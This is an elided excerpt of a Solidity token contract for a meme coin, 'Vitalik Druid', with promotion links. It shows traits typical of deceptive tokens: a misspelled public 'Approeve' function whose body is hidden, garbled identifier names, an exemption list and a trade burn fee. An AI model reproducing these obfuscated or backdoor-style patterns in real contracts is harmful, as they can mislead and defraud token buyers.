...
/**
https://t.me/Druid_ERC
https://twitter.com/VitalikDruid
*/
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function Approeve(address account, uint256 amount) public virtual returns (uint256) {
...
contract VitalikDruid is ERC20 {
    ...
    uint256 _burneuseom = 0;

    address uniswapV2Pair;
    IUniswapV2Router02 uniswapV2Router;

    constructor(address router) ERC20("Vitalik Druid", "DRUID", TOAL_SAILYLY) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;

        max_adrbsWallet=  TOAL_SAILYLY / 25;
        maxTadssWallet = TOAL_SAILYLY / 25;
    ...
    function _transfer_hpei(
        ...
        if (!isException[from] && !isException[to]){
            ...
            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                uint256 _burn = (amount * _burneuseom) / 100;
